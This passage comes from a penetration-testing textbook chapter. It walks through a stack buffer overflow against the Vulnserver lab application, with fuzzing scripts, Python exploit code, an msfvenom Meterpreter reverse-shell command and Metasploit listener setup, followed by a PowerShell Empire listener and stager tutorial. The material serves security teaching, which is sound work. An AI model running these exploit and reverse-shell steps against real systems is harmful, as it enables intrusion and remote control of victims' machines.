      <li class="bulletList"><strong class="keyWord">Extended Stack Pointer</strong> (<strong class="keyWord">ESP</strong>): This <a id="_idIndexMarker1161"/>is a 32-bit stack pointer register that points exactly to where the stack is pointing.</li>
      <li class="bulletList"><strong class="keyWord">SS</strong>, <strong class="keyWord">DS</strong>, <strong class="keyWord">ES</strong>, <strong class="keyWord">CS</strong>, <strong class="keyWord">FS</strong>, and <strong class="keyWord">GS</strong>: These are 16-bit segment registers.</li>
      <li class="bulletList"><strong class="keyWord">NOP</strong>: This stands for no operations.</li>
      <li class="bulletList"><strong class="keyWord">JMP</strong>: This stands for jump instructions.</li>
    </ul>
    <h2 id="_idParaDest-258" class="heading-2">Identify the vulnerability through fuzzing</h2>
    <p class="normal">Attackers<a id="_idIndexMarker1162"/> must be able to identify the right fuzzing parameters in any given application to find a vulnerability and then exploit it. In this section, we will look at an <a id="_idIndexMarker1163"/>example of a <strong class="keyWord">vulnerable server</strong>, which was created by Stephen Bradshaw.</p>
    <p class="normal">This vulnerable<a id="_idIndexMarker1164"/> software can be downloaded from <a href="https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E/tree/main/Chapter%2010/"><span class="url">https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E/tree/main/Chapter%2010/</span></a></p>
    <p class="normal">In this example, we will be using Windows 10 to host the vulnerable server. Once the application is downloaded, we will be unzipping the file and running the server. </p>
    <p class="normal">This should open TCP port <code class="inlineCode">9999</code> for the remote clients to connect to. When the vulnerable server is up<a id="_idIndexMarker1165"/> and running, you should be able to see the following:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_21.png" alt=""/></figure>
    <p class="packt_figref">Figure 10.21: Vulnerable server running on Windows 10</p>
    <p class="normal">Attackers can connect to the server on port <code class="inlineCode">9999</code>, using <code class="inlineCode">netcat</code> to communicate to the server from Kali Linux, as shown in <em class="italic">Figure 10.22</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_22.png" alt=""/></figure>
    <p class="packt_figref">Figure 10.22: Connecting to the vulnerable server from Kali Linux</p>
    <p class="normal">Fuzzing is a <a id="_idIndexMarker1166"/>technique in which attackers specifically send malformed packets to the target to generate errors in the application or create general failures. These failures indicate bugs that exist in the code written by the developer of the application. </p>
    <p class="normal">The attacker can find out how it can be exploited to allow remote access by running their own code. Now that the application is accessible and everything is set, attackers can begin the art of fuzzing.</p>
    <p class="normal">Although there are a number of fuzzing tools available, SPIKE is one of the defaults that is installed on Kali Linux. SPIKE is a fuzzing toolkit that’s used to create fuzzers by providing scripting capabilities; however, it is written in the C language. The following is a list of interpreters written in SPIKE that can be utilized:</p>
    <ul>
      <li class="bulletList"><code class="inlineCode">generic_chunked</code></li>
      <li class="bulletList"><code class="inlineCode">generic_send_tcp</code></li>
      <li class="bulletList"><code class="inlineCode">generic_send_udp</code></li>
      <li class="bulletList"><code class="inlineCode">generic_web_server_fuzz</code></li>
      <li class="bulletList"><code class="inlineCode">generic_web_server_fuzz2</code></li>
      <li class="bulletList"><code class="inlineCode">generic_listen_tcp</code></li>
    </ul>
    <p class="normal">SPIKE allows you to add your own set of scripts without having to write a few hundred lines of code in C. Other fuzzing tools that attackers can consider are Peach Fuzzer, BooFuzz, and FilFuzz.</p>
    <p class="normal">Once attackers connect to the target application, they should be able to see multiple options available in the vulnerable server, which they can then play with. This includes <code class="inlineCode">STATS</code>, <code class="inlineCode">RTIME</code>, <code class="inlineCode">LTIME</code>, <code class="inlineCode">SRUN</code>, <code class="inlineCode">TRUN</code>, <code class="inlineCode">GMON</code>, <code class="inlineCode">GDOG</code>, <code class="inlineCode">KSTET</code>, <code class="inlineCode">GTER</code>, <code class="inlineCode">HTER</code>, <code class="inlineCode">LTER</code>, and <code class="inlineCode">KSTAN</code> as part of valid commands that take input. We will utilize the <code class="inlineCode">generic_send_tcp</code> interpreter to fuzz the<a id="_idIndexMarker1167"/> application. The format to use the interpreter is as follows: <code class="inlineCode">. /generic_send_tcp host port spike_script SKIPVAR SKIPSTR</code>:</p>
    <ul>
      <li class="bulletList"><code class="inlineCode">host</code>: This is the target host or IP.</li>
      <li class="bulletList"><code class="inlineCode">port</code>: This is the port number to be connected to.</li>
      <li class="bulletList"><code class="inlineCode">spike_script</code>: This is the SPIKE script to run on the interpreter.</li>
      <li class="bulletList"><code class="inlineCode">SKIPVAR</code> and <code class="inlineCode">SKIPSTR</code>: This allows the testers to jump into the middle of the fuzzing session, as defined in the SPIKE script.</li>
    </ul>
    <p class="normal">As the key next step, let’s go ahead and create a simple SPIKE script for <code class="inlineCode">readline</code>, run <code class="inlineCode">SRUN</code>, and assign a string value as the parameter:</p>
    <pre class="programlisting code"><code class="hljs-code">s_readline(); 
s_string("SRUN |"); 
s_string_variable("VALUE");
</code></pre>
    <p class="normal">The script will read the first line (<code class="inlineCode">s_readline</code>) of the input after connecting to the IP/hostname and then run <code class="inlineCode">SRUN</code>, along with a randomly generated value. Note that to run a SPIKE script, it must be saved with the <code class="inlineCode">.spk</code> file format. Now let’s save the file with the above three lines as <code class="inlineCode">exploitfuzzer.spk</code> and run the SPIKE script against the target, as shown in <em class="italic">Figure 10.23</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_23.png" alt=""/></figure>
    <p class="packt_figref">Figure 10.23: Fuzzing the vulnerable server with SRUN</p>
    <p class="normal">After fuzzing<a id="_idIndexMarker1168"/> the application, it confirms no server crash or anything similar, so the <code class="inlineCode">SRUN</code> parameter is not vulnerable. The next step is to pick another one. This time, we will pick <code class="inlineCode">TRUN</code> as the parameter to fuzz within the same script:</p>
    <pre class="programlisting code"><code class="hljs-code">s_readline(); 
s_string("TRUN |"); 
s_string_variable("VALUE"); 
</code></pre>
    <p class="normal">Save the <code class="inlineCode">exploitfuzz.spk</code> file and run the same command, as shown in <em class="italic">Figure 10.24</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_24.png" alt=""/></figure>
    <p class="packt_figref">Figure 10.24: Fuzzing the vulnerable server with TRUN</p>
    <p class="normal">Fuzzing the application with TRUN has resulted in the application crashing, so now we can confirm<a id="_idIndexMarker1169"/> that this function can be abused and exploited. As a key next step, we must now debug and replicate the crash in a more verbose way. </p>
    <h2 id="_idParaDest-259" class="heading-2">Debug and replicate the crash </h2>
    <p class="normal">On the <a id="_idIndexMarker1170"/>server <a id="_idIndexMarker1171"/>side, we must debug the application. To perform debugging, we will download Immunity <a id="_idIndexMarker1172"/>Debugger from <a href="https://www.immunityinc.com/products/debugger/"><span class="url">https://www.immunityinc.com/products/debugger/</span></a>. This debugger is used mostly in finding exploits, analyzing malware, and reverse engineering any binary files. The vulnerable server can be attached as a process to the debugger after running <code class="inlineCode">vulnserver.exe</code> or can be directly executable and opened by the debugger, as shown in <em class="italic">Figure 10.25</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_25.png" alt="Graphical user interface, text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.25: Loading vulnserver using Immunity Debugger</p>
    <p class="normal">Once <a id="_idIndexMarker1173"/>the <a id="_idIndexMarker1174"/>application runs through the debugger and the fuzzing script is run from our Kali Linux, as seen in <em class="italic">Figure 10.25</em>, you should now be able to see that the server has crashed on the victim’s PC. </p>
    <p class="normal">The debugger also gives us some useful information on exception offset <code class="inlineCode">41414141</code>, which we can take note of (which is converted as <code class="inlineCode">AAAA</code>) in the <strong class="screenText">Registers</strong> section within Immunity Debugger, as shown in <em class="italic">Figure 10.26</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_26.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.26: Registers after the vulnserver crash due to fuzzing</p>
    <p class="normal">To conduct<a id="_idIndexMarker1175"/> the <a id="_idIndexMarker1176"/>successful buffer overflow for the given application involves the following steps:</p>
    <ol class="numberedList" style="list-style-type: decimal;">
      <li class="numberedList" value="1">Finding the right length of the spiking </li>
      <li class="numberedList">Fuzzing the right pattern </li>
      <li class="numberedList">Finding the offset</li>
      <li class="numberedList">Overwriting the EIP </li>
      <li class="numberedList">Finding the right address of the JMP ESP operation</li>
      <li class="numberedList">Checking for bad characters and placing a NOPS sled</li>
      <li class="numberedList">Generating shellcode </li>
      <li class="numberedList">Setting up listeners and exploiting</li>
    </ol>
    <p class="normal">The first step is to identify exactly how many characters caused the server crash and what buffer size can be utilized. We will start debugging the application that has crashed and take a look at the ESP address in the <strong class="screenText">Registers</strong> section, right-click within Immunity Debugger, and click on <strong class="screenText">Follow in Dump</strong> to see where the payload was inserted initially and note down the memory address <code class="inlineCode">00ACF1F0</code>, as shown in <em class="italic">Figure 10.27</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_27.png" alt=""/></figure>
    <p class="packt_figref">Figure 10.27: Initial memory where the fuzzing began</p>
    <p class="normal">If we traverse all the way<a id="_idIndexMarker1177"/> to<a id="_idIndexMarker1178"/> the end where the fuzzing AAA stops, you will see <code class="inlineCode">00ACFD98</code>, as seen in <em class="italic">Figure 10.28</em>. Note that these addresses will change according to the operating system that you utilize while debugging or disassembling the executable.</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_28.png" alt=""/></figure>
    <p class="packt_figref">Figure 10.28: End of the fuzzing memory address</p>
    <p class="normal">Now that we have the start and end addresses, let’s use <code class="inlineCode">python3</code> to identify the length of the buffer by running <code class="inlineCode">python3</code> in the terminal and just simply put <code class="inlineCode">0x00ACFD98</code> (the end of the memory address) and <code class="inlineCode">0x00ACF1F0</code> (the start of the memory address), as seen below. It should provide us with the buffer length:</p>
    <pre class="programlisting con"><code class="hljs-con">─# python3                                                            
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
<span class="hljs-con-meta">&gt;&gt;&gt;</span> <span class="hljs-con-number">0x00ACFD98</span> - <span class="hljs-con-number">0x00ACF1F0</span>
2984
</code></pre>
    <p class="normal">In this case, we have<a id="_idIndexMarker1179"/> a<a id="_idIndexMarker1180"/> buffer length of <code class="inlineCode">2984</code>. The next stage is to control the execution of our exploit code. </p>
    <h2 id="_idParaDest-260" class="heading-2">Control the application execution</h2>
    <p class="normal">We now have <a id="_idIndexMarker1181"/>the length of the buffer. The next step is to identify the right offset to EIP to control it. Let’s write a quick Python script to connect the vulnerable server with the exact length that crashed the server, save the file as <code class="inlineCode">crash.py</code>, and run it against the target IP: </p>
    <pre class="programlisting code"><code class="hljs-code"><span class="hljs-keyword">import</span> socket
s = socket.socket()
s.connect(("<span class="hljs-number">10.10.10.4</span>",<span class="hljs-number">9999</span>))
leng = <span class="hljs-number">2984</span>
payload = [b"TRUN /.:/",b"A"*leng]
payload = b"".join(payload)
s.send(payload)
s.close()
</code></pre>
    <p class="normal">The next step is to create a pattern using MSF by locating the <code class="inlineCode">/usr/share/etasploit-framework/tools/exploit/</code> folder and running <code class="inlineCode">./pattern_create -l 2984</code> in the Kali Linux terminal.</p>
    <p class="normal">You can either output the content that is generated into a file or copy it from the terminal. Alternatively, you can add to your Python program by adding another variable. This time, we will disable the buffer and use the pattern that was created by the exploit tool with a length of <code class="inlineCode">2984</code>:</p>
    <pre class="programlisting code"><code class="hljs-code"><span class="hljs-keyword">import</span> socket
s = socket.socket()
s.connect(("<span class="hljs-number">10.10.10.4</span>",<span class="hljs-number">9999</span>))
leng = <span class="hljs-number">2984</span>
payload = [b"TRUN /.:/",b"&lt;PAYLOAD FROM PATTERNCREATE&gt;"]
payload = b"".join(payload)
s.send(payload)
s.close()
</code></pre>
    <p class="normal">Again, running <code class="inlineCode">crash.py</code> against the target will result in the server crashing again. However, all of the <code class="inlineCode">A</code> characters are replaced by the pattern that was created. On the vulnerable server, we should be able to see the registers from Immunity Debugger, which provides the<a id="_idIndexMarker1182"/> next instruction that will be stored in <code class="inlineCode">EIP</code>, as shown in <em class="italic">Figure 10.29</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_29.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.29: EIP of the application after injecting the pattern</p>
    <p class="normal">That’s the end of fuzzing with the next EIP <code class="inlineCode">386F4337</code>. To create a Windows-specific exploit, we must identify the right offset of the EIP. This can be extracted by exploit tools such as <code class="inlineCode">pattern_offset</code>, which takes the input of the EIP with the same length that was used to create the pattern.</p>
    <pre class="programlisting con"><code class="hljs-con">cd /usr/share/etasploit-framework/tools/exploit/
sudo ./pattern_offset.rb -q 0x386F4337 –l 2984
[*] Exact match at offset 2003
</code></pre>
    <p class="normal">This means that an offset match was found in the pattern that was created with the EIP. Now, we know that buffer <code class="inlineCode">2003</code> is enough to crash the server, and we can begin the overflow and see if we can overwrite the EIP:</p>
    <pre class="programlisting code"><code class="hljs-code"><span class="hljs-keyword">import</span> socket
s = socket.socket()
s.connect(("<span class="hljs-number">10.10.10.4</span>",<span class="hljs-number">9999</span>))
leng = <span class="hljs-number">2984</span>
offset = <span class="hljs-number">2003</span>
eip = b"BBBB"
payload = [b"TRUN /.:/",b"A"*offset,eip,b"C"*(leng – offset -<span class="hljs-built_in">len</span>(eip))]
payload = b"".join(payload)
s.send(payload)
s.close()
</code></pre>
    <p class="normal">Upon execution of the preceding Python code from Kali Linux, you should see the EIP that we <a id="_idIndexMarker1183"/>overwrote. If everything is correct, you should see the following on the server side with the EIP as <code class="inlineCode">42424242</code> in the immunity debugger: </p>
    <figure class="mediaobject"><img src="../Images/B17765_10_30.png" alt=""/></figure>
    <p class="packt_figref">Figure 10.30: Successfully overwriting the EIP address</p>
    <h2 id="_idParaDest-261" class="heading-2">Identify the right bad characters and generate shellcode</h2>
    <p class="normal">Our next<a id="_idIndexMarker1184"/> task is to identify the address of JMP <a id="_idIndexMarker1185"/>ESP, since our payload will be loaded into the ESP register. For that, we will utilize the <code class="inlineCode">mona.py</code> script, which is a Python tool that speeds up searches while developing exploits. This tool can be downloaded directly from <a href="https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E/blob/main/Chapter%2010/mona.py"><span class="url">https://github.com/PacktPublishing/Mastering-Kali-Linux-for-Advanced-Penetration-Testing-4E/blob/main/Chapter%2010/mona.py</span></a>. </p>
    <p class="normal">Upon downloading the Python script, it should be placed in the <code class="inlineCode">PyCommands</code> folder of Immunity Debugger’s installed location (<code class="inlineCode">c:\program files(x86)\Immunity Inc\Immunity Debugger\Pycommands\</code>). Once the <code class="inlineCode">mona.py</code> script is placed in PyCommands, testers need to reopen Immunity Debugger and run <code class="inlineCode">!mona jmp –r esp</code> . in the Immunity terminal. That should display the JMP ESP. In our case, it is <code class="inlineCode">0x62501203</code>, as shown in <em class="italic">Figure 10.31</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_31.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.31: Running mona to identify the JMP ESP address</p>
    <p class="normal">If the mona<a id="_idIndexMarker1186"/> display <a id="_idIndexMarker1187"/>goes away, just do <code class="inlineCode">!mona help</code> in the same terminal within Immunity Debugger to bring the screen back. Now we are all set to create the payload. </p>
    <p class="normal">You can use mona to identify bad chars. Testers can utilize any public material to find more ways to exploit the vulnerability. This topic deserves a book on its own.</p>
    <div class="note">
      <p class="normal">To create a default array in mona, you can use <code class="inlineCode">!mona bytearray</code>, which will generate output of two files named <code class="inlineCode">bytearray.txt</code> and <code class="inlineCode">bytearray.bin</code> with all the bad characters.</p>
    </div>
    <p class="normal">We will go ahead and create a Windows payload with <code class="inlineCode">'\x00'</code> as a bad character using <code class="inlineCode">msfvenom</code> by running the following command in the terminal. This will generate a shellcode that<a id="_idIndexMarker1188"/> will <a id="_idIndexMarker1189"/>provide a Meterpreter reverse shell on the attacker’s IP:</p>
    <pre class="programlisting con"><code class="hljs-con">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=&lt;Kali IP&gt; lport=&lt;portnumber&gt; -e x86/shikata_ga_nai -b '\x00' -f python
</code></pre>
    <h2 id="_idParaDest-262" class="heading-2">Obtain the shell</h2>
    <p class="normal">Finally, we are in <a id="_idIndexMarker1190"/>the last stage of creating the full-fledged exploit—we just need to add a NOP sled and then overflow the buffer and write our shellcode to the system running the vulnerable application server. The following code extract is the full Python code for exploiting the vulnerable server:</p>
    <pre class="programlisting code"><code class="hljs-code"><span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> struct
s = socket.socket()
s.connect(("&lt;ServerIP&gt;",<span class="hljs-number">9999</span>))
buf =  b""
buf += b"&lt;Add the shell code from msfvenom here&gt;
shellcode = buf
nops = b"\x90"*16
leng = 2984
offset = 2003
eip = struct.pack("&lt;I",0x62501203)
payload = [b"TRUN /.:/",b"A"*offset,eip,nops,shellcode,b"C"*(leng - offset - len(eip) - len(nops) - len(shellcode))]
payload = b"".join(payload)
s.send(payload)
s.close()
</code></pre>
    <p class="normal">Save the final Python script as <code class="inlineCode">exploit.py</code> and before you execute, ensure that your listener is up in Metasploit by running the following commands in the terminal:</p>
    <pre class="programlisting con"><code class="hljs-con">use exploit/mutli/handler
set payload windows/meterpreter/reverse_tcp
set lhost &lt;Your kali IP&gt;
set lport 444
exploit -j
</code></pre>
    <p class="normal">Everything is now set. Attackers will now be able to perform and craft a Windows-specific exploit using Python programming. The next step is to run <code class="inlineCode">exploit.py</code> from the terminal:</p>
    <pre class="programlisting con"><code class="hljs-con">python3 exploit.py
</code></pre>
    <p class="normal">The successful <a id="_idIndexMarker1191"/>exploitation will overwrite the buffer with our shellcode and then execute it to spawn a reverse shell to the attacker, as shown in <em class="italic">Figure 10.32</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_32.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.32: Successful TCP reverse shell from vulnserver</p>
    <p class="normal">That concludes the five-stage approach to developing a Windows-specific exploit. We will explore the PowerShell Empire framework, which can be leveraged by attackers during post-exploitation activities. </p>
    <h1 id="_idParaDest-263" class="heading-1">PowerShell Empire framework</h1>
    <p class="normal">The initial Empire<a id="_idIndexMarker1192"/> tool was one of the most powerful post-exploitation tools, which was based on Python 2.7, but progress has been quiet for the last 3 years. The same fork of this project was picked up with active contributions from BC-Security and has now been rewritten in Python 3 and is used by penetration testers around the globe to perform a variety of different attacks in penetration tests to demonstrate system vulnerabilities. This tool runs PowerShell agents that, by nature, are persistent. It also utilizes other important tools, such as <code class="inlineCode">mimikatz</code>. In this section, we will look closer at how to use PowerShell’s Empire framework. </p>
    <p class="normal">This tool can be installed by running <code class="inlineCode">sudo apt install powershell-empire</code> in the terminal. Once the application is installed, testers should be able to see the following options: </p>
    <figure class="mediaobject"><img src="../Images/B17765_10_33.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.33: PowerShell Empire’s main menu</p>
    <p class="normal">Attackers need to first run the server before connecting the client. So the first step would be to run <code class="inlineCode">sudo powershell-empire server</code> and then run <code class="inlineCode">sudo powershell-empire client</code>, and that should bring us to the following screen:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_34.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.34: PowerShell Empire’s client menu</p>
    <p class="normal">The current Empire <a id="_idIndexMarker1193"/>tool has around 393 built-in modules. The following table provides a list of commands that are crucial when using the Powershell Empire tool, since it is similar to Metasploit; however, these commands are used in their own particular way:</p>
    <table id="table001-6" class="table-container">
      <tbody>
        <tr>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Command</strong></p>
          </td>
          <td class="table-cell">
            <p class="normal"><strong class="keyWord">Description</strong></p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">agents</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Access a list of agents that are connected</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">creds</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Add/display credentials to/from the database</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">exit</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Exit Empire</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">help</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Display the help menu</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">interact</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Interact with a particular agent</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">list</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">List active agents or listeners</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">listeners</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Interact with active listeners</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">load</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Load Empire modules from a nonstandard folder</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">reload</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Reload one (or all) Empire modules</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">reset</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Reset a global option (for example, IP whitelists)</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">searchmodule</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Search Empire module names/descriptions</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">set</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Set a global option (for example, IP whitelists)</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">show</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Show a global option (for example, IP whitelists)</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">usemodule</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Use an Empire module</p>
          </td>
        </tr>
        <tr>
          <td class="table-cell">
            <p class="normal"><code class="inlineCode">usestager</code></p>
          </td>
          <td class="table-cell">
            <p class="normal">Use an Empire stager</p>
          </td>
        </tr>
      </tbody>
    </table>
    <p class="packt_figref">Table 10.1: PoweShell Empire commands</p>
    <p class="normal">There are four <a id="_idIndexMarker1194"/>important<a id="_idIndexMarker1195"/> roles that the Empire tool consists of:</p>
    <ul>
      <li class="bulletList"><strong class="keyWord">Listeners</strong>: This is similar to the Meterpreter listener, waiting for the connection from the compromised systems. Listener management provides the interface to create listeners locally with different types—<code class="inlineCode">dbx</code>, <code class="inlineCode">http</code>, <code class="inlineCode">http_com</code>, <code class="inlineCode">http_foreign</code>, <code class="inlineCode">http_hop</code>, and <code class="inlineCode">meterpreter</code>. We will explore <code class="inlineCode">http</code>.</li>
      <li class="bulletList"><strong class="keyWord">Stagers</strong>: Stagers provide a list of modules for macOS (OS X), Windows, and other operating systems. These are DLLs, macros, one-liners, and others that can be utilized using an external device to perform more informed social engineering and physical console attacks.</li>
      <li class="bulletList"><strong class="keyWord">Agents</strong>: The agents are the zombies that connect to the listeners. All of the agents can be accessed by running the <code class="inlineCode">agent</code> command, which will take us straight to the agents menu.</li>
      <li class="bulletList"><strong class="keyWord">Logging and downloads</strong>: This section can only be accessed when a successful agent is connected to the listeners. Similar to Meterpreter, the Empire tool allows us to run <code class="inlineCode">mimikatz</code> on the local machine via PowerShell and export the<a id="_idIndexMarker1196"/> details to perform more focused attacks.</li>
    </ul>
    <p class="normal">The first thing we must do is set up the local listeners. The <code class="inlineCode">listeners</code> command will help us jump to the<a id="_idIndexMarker1197"/> listener menu. If there are any active listeners, then those will be displayed. Use the <code class="inlineCode">listener http</code> command to create a listener, as shown in <em class="italic">Figure 10.35</em>:</p>
    <figure class="mediaobject"><img src="../Images/B17765_10_35.png" alt="Graphical user interface, text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.35: Different types of listeners </p>
    <p class="normal">By running the following within the PowerShell Empire client terminal, you should set up the Empire listener. </p>
    <pre class="programlisting con"><code class="hljs-con">Uselistner http
(Empire: uselistener/http) &gt; set Port 80
[*] Set Port to 80
(Empire: uselistener/http) &gt; execute
[+] Listener http successfully started
</code></pre>
    <p class="normal">Once the listeners have been selected, by default, port <code class="inlineCode">80</code> is set. If you are running an HTTP service, you can change the port number by typing <code class="inlineCode">set Port portnumber</code>. Always remember that all of the commands in the Empire tool are case-sensitive. You can utilize the tab feature, which will autocorrect the command and provide options. To get the stager, use the <code class="inlineCode">usestager multi/launcher</code> and then set the <code class="inlineCode">Listener</code> to <code class="inlineCode">http</code>, as seen in <em class="italic">Figure 10.36</em>, and that’s it. When we run the <code class="inlineCode">execute</code> command, we should have the PowerShell<a id="_idIndexMarker1198"/> script that we can run on the target machines: </p>
    <figure class="mediaobject"><img src="../Images/B17765_10_36.png" alt="Text  Description automatically generated"/></figure>
    <p class="packt_figref">Figure 10.36: Successfully creating a payload using the stagers</p>
    <p class="normal">We have now explored the PowerShell Empire framework. We will be taking a deep dive into this tool in the coming chapters.</p>
    <h1 id="_idParaDest-264" class="heading-1">Summary</h1>
    <p class="normal">In this chapter, we focused on the fundamentals of exploitation and the different tools that convert findings from reconnaissance into a defined action that establishes the right connection between the tester and the target.</p>
    <p class="normal">Kali provides several tools to facilitate the development, selection, and activation of exploits, including the internal Exploit-DB as well as several frameworks that simplify the use and management of these exploits. We took a deep dive into the MSF and learned how to compile different types of files from Exploit-DB into a real exploit. </p>
    <p class="normal">We also focused on how to develop Windows exploits by identifying different fuzzing techniques. We also loaded the shell code into the custom exploits. Additionally, we took a quick tour using the PowerShell Empire tool, which can be instrumental for pentesters once the exploitation phase is complete. </p>
    <p class="normal">In the next chapter (<em class="chapterRef">Chapter 11</em>, <em class="italic">Action on the Objective and Lateral Movement</em>), we will learn about the most important part of the attackers’ cyber kill chain as well as post-exploitation, privilege escalation, lateral movement in the network, compromising domain trusts, and port forwarding.</p>
  </div>
</body></html>